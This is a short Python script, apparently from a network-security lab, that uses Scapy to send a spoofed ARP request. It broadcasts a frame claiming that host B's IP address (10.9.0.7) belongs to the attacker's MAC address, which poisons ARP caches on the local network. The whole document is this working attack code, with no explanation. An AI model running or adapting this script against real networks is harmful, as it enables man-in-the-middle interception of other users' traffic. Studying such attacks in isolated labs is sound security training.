from scapy.all import *
ip_A = '10.9.0.5'
mac_A = '02:42:0a:09:00:05'
ip_B = '10.9.0.7'
mac_B = '02:42:0a:09:00:07'
ip_M = '10.9.0.105'
mac_M = '02:42:0a:09:00:69'
boardcast = 'ff:ff:ff:ff:ff:ff'
E = Ether(src = mac_M, dst = boardcast)
A = ARP()
A.hwsrc = mac_M
A.psrc = ip_B
A.hwdst = boardcast
A.pdst = ip_B
A.op = 1
sendp(E/A)